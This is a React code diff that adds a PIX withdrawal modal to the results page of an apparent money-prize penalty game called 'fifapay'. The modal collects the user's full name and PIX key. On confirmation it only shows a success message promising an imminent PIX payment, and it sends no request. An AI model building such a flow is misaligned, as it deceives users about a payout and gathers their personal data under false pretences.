@@ -1,6 +1,6 @@
 import { useEffect, useMemo, useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { Wallet, CreditCard } from "lucide-react";
+import { Wallet, CreditCard, X, ChevronDown } from "lucide-react";
 import logo from "@/assets/fifapay-logo.png";
 import coin from "@/assets/coin-p.png";
 import pixLogo from "@/assets/pix-logo.svg";
@@ -25,6 +25,14 @@ const Resgate = () => {
   const [secondsLeft, setSecondsLeft] = useState(EXPIRES_SECONDS);
   const [amount, setAmount] = useState(formatBRL(balance));
 
+  // Modal de Saque PIX
+  const [pixOpen, setPixOpen] = useState(false);
+  const [fullName, setFullName] = useState("");
+  const [pixType, setPixType] = useState<"" | "CPF" | "E-mail" | "Celular" | "Chave Aleatória">("");
+  const [pixKey, setPixKey] = useState("");
+  const [typeOpen, setTypeOpen] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
+
   useEffect(() => {
     const id = setInterval(() => setSecondsLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
     return () => clearInterval(id);
@@ -42,7 +50,25 @@ const Resgate = () => {
 
   const handleWithdraw = () => {
     sessionStorage.setItem("fifapay:withdraw", amount);
-    // Próxima etapa do fluxo (a definir). Por enquanto fica aqui.
+    setPixOpen(true);
+    setSubmitted(false);
+  };
+
+  const closePix = () => {
+    setPixOpen(false);
+    setTypeOpen(false);
+  };
+
+  const confirmPix = () => {
+    if (!fullName.trim() || !pixType || !pixKey.trim()) return;
+    setSubmitted(true);
+  };
+
+  const placeholderByType: Record<string, string> = {
+    CPF: "000.000.000-00",
+    "E-mail": "voce@email.com",
+    Celular: "(11) 99999-9999",
+    "Chave Aleatória": "xxxx-xxxx-xxxx-xxxx",
   };
 
   return (
@@ -181,12 +207,156 @@ const Resgate = () => {
 
         <button
           type="button"
-          onClick={() => navigate("/jogar")}
+          onClick={() => {
+            // Reinicia a partida mantendo o jogador
+            sessionStorage.removeItem("fifapay:balance");
+            sessionStorage.removeItem("fifapay:goals");
+            sessionStorage.removeItem("fifapay:withdraw");
+            navigate("/penaltis");
+          }}
           className="mt-6 w-full rounded-2xl border-2 border-emerald-600/50 bg-emerald-900/30 py-3.5 text-sm font-bold text-emerald-100 transition-all hover:bg-emerald-900/50 active:scale-[0.99]"
         >
           Jogar novamente
         </button>
       </div>
+
+      {/* Modal Saque PIX */}
+      {pixOpen && (
+        <div
+          className="fixed inset-0 z-50 flex items-end justify-center bg-black/70 backdrop-blur-sm sm:items-center"
+          onClick={closePix}
+        >
+          <div
+            className="w-full max-w-md rounded-t-2xl border border-emerald-700/50 bg-emerald-950 p-5 shadow-2xl sm:rounded-2xl"
+            onClick={(e) => e.stopPropagation()}
+          >
+            {/* Cabeçalho */}
+            <div className="mb-4 flex items-start justify-between">
+              <div>
+                <p className="text-[11px] font-bold uppercase tracking-wider text-emerald-300/80">
+                  Saque PIX
+                </p>
+                <p className="mt-1 text-base font-display font-bold text-white">
+                  Valor: R$ {formatBRL(parseFloat(amount.replace(",", ".")) || 0)}
+                </p>
+              </div>
+              <button
+                type="button"
+                onClick={closePix}
+                aria-label="Fechar"
+                className="rounded-full p-1 text-emerald-200/80 hover:bg-emerald-900/60 hover:text-white"
+              >
+                <X className="h-5 w-5" />
+              </button>
+            </div>
+
+            {submitted ? (
+              <div className="py-6 text-center">
+                <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-yellow-400/20">
+                  <Wallet className="h-7 w-7 text-yellow-300" />
+                </div>
+                <h3 className="mb-1 text-lg font-display font-bold text-white">
+                  Solicitação enviada!
+                </h3>
+                <p className="text-sm text-emerald-200/80">
+                  Em instantes você receberá o PIX de{" "}
+                  <span className="font-bold text-yellow-300">
+                    R$ {formatBRL(parseFloat(amount.replace(",", ".")) || 0)}
+                  </span>{" "}
+                  na chave informada.
+                </p>
+                <button
+                  type="button"
+                  onClick={closePix}
+                  className="mt-5 w-full rounded-xl bg-gradient-to-r from-yellow-400 to-amber-400 py-3 text-sm font-display font-bold text-emerald-950"
+                >
+                  Concluir
+                </button>
+              </div>
+            ) : (
+              <>
+                {/* Nome completo */}
+                <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
+                  Nome completo
+                </label>
+                <input
+                  type="text"
+                  value={fullName}
+                  onChange={(e) => setFullName(e.target.value.slice(0, 100))}
+                  placeholder="Como no documento"
+                  className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
+                />
+
+                {/* Tipo de chave PIX */}
+                <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
+                  Tipo de chave PIX
+                </label>
+                <button
+                  type="button"
+                  onClick={() => setTypeOpen((o) => !o)}
+                  className="mb-2 flex w-full items-center justify-between rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-left text-sm font-medium text-white"
+                >
+                  <span className={pixType ? "text-white" : "text-emerald-500/70"}>
+                    {pixType || "Selecione o tipo"}
+                  </span>
+                  <ChevronDown
+                    className={`h-4 w-4 text-emerald-300 transition-transform ${
+                      typeOpen ? "rotate-180" : ""
+                    }`}
+                  />
+                </button>
+
+                {typeOpen && (
+                  <div className="mb-3 overflow-hidden rounded-xl border border-emerald-700/60 bg-emerald-900/70">
+                    {(["CPF", "E-mail", "Celular", "Chave Aleatória"] as const).map((t) => (
+                      <button
+                        key={t}
+                        type="button"
+                        onClick={() => {
+                          setPixType(t);
+                          setTypeOpen(false);
+                          setPixKey("");
+                        }}
+                        className={`block w-full border-b border-emerald-800/60 px-4 py-3 text-left text-sm font-bold last:border-b-0 hover:bg-emerald-800/60 ${
+                          pixType === t ? "text-yellow-300" : "text-white"
+                        }`}
+                      >
+                        {t}
+                      </button>
+                    ))}
+                  </div>
+                )}
+
+                {/* Chave PIX */}
+                {pixType && (
+                  <>
+                    <label className="mb-1.5 block text-xs font-bold text-emerald-200/90">
+                      Chave {pixType}
+                    </label>
+                    <input
+                      type="text"
+                      value={pixKey}
+                      onChange={(e) => setPixKey(e.target.value.slice(0, 80))}
+                      placeholder={placeholderByType[pixType]}
+                      className="mb-4 w-full rounded-xl border border-emerald-700/60 bg-emerald-900/50 px-3 py-3 text-sm font-medium text-white placeholder:text-emerald-500/60 focus:border-yellow-400/50 focus:outline-none focus:ring-2 focus:ring-yellow-400/30"
+                    />
+                  </>
+                )}
+
+                <button
+                  type="button"
+                  onClick={confirmPix}
+                  disabled={!fullName.trim() || !pixType || !pixKey.trim()}
+                  className="mt-2 flex h-12 w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-yellow-400 to-amber-400 text-sm font-display font-bold text-emerald-950 shadow-lg shadow-yellow-500/25 transition-all hover:from-yellow-300 hover:to-amber-300 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-50"
+                >
+                  <Wallet className="h-5 w-5" strokeWidth={2.5} />
+                  Confirmar saque
+                </button>
+              </>
+            )}
+          </div>
+        </div>
+      )}
     </div>
   );
 };
